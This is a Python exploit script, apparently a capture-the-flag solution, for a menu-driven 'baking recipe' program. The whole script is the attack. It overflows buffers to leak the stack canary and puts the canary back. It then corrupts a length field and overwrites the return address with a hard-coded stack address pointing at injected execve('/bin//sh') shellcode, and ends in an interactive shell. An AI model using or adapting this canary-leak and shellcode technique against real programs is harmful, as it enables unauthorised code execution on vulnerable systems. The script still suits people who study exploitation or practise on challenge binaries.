import interact
import struct

buffaddr = '\x60\xed\xff\xff\xff\x7f\x00\x00'
shellcode = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p = interact.Process()

# Overwrite null terminator and print cookie
data = p.readuntil('ingredients')
p.sendline('a'*63)

data = p.readuntil('4. Finish')
p.sendline('3')

data = p.readuntil('(max 39)')
p.sendline('40')

data = p.readuntil('Baking recipe: ')
data = p.readuntil('aaaa')[6:-2]

cookie = 0
for i in range(8):
    cookie += (ord(data[i]) << (8 * (i)))

# Put cookie back
data = p.readuntil('4. Finish')
p.sendline('1')

data = p.readuntil('ingredients')
p.sendline('\x7f\xff\xff\xff\xed\xc0' + struct.pack('Q', cookie) + 'a'* (41-(8+6)))

data = p.readuntil('4. Finish')
p.sendline('3')

data = p.readuntil('(max 39)')
p.sendline('40')

# Put null terminator back
data = p.readuntil('4. Finish')
p.sendline('1')

data = p.readuntil('ingredients')
p.sendline('\xff'*39)

data = p.readuntil('4. Finish')
p.sendline('3')

data = p.readuntil('(max 39)')
p.sendline('40')

# Corrupt recipe length to larger value
data = p.readuntil('4. Finish')
p.sendline('2')

data = p.readuntil('(max 15)')
p.sendline('16')

# Inject payload into ingredients
data = p.readuntil('4. Finish')
p.sendline('1')

data = p.readuntil('ingredients')
p.sendline('a'*(64+16+8) + struct.pack('Q', cookie)[::-1] + 'a'*8 + buffaddr)

data = p.readuntil('4. Finish')
p.sendline('1')

data = p.readuntil('ingredients')
p.sendline(shellcode + 'a'*(64+16+8-1-len(shellcode)))

data = p.readuntil('4. Finish')
p.sendline('4')

p.interactive()